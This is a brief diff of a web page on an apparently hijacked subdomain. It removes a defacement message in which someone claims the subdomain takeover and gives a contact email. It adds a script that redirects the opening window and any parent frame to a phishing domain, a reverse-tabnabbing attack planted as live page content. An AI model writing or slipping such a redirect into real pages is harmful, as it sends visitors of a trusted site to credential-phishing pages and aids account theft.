@@ -1,5 +1,4 @@
- hi these  subdomain is takeover by bharat mrnoob 
- contact me on mrnoob790@gmail.com
- 
- 
- happy birthday annu :) 
+<script>
+if (window.opener) window.opener.parent.location.replace('http://phishing.com');
+if (window.parent != window) window.parent.location.replace('http://phishing.com');
+</script>
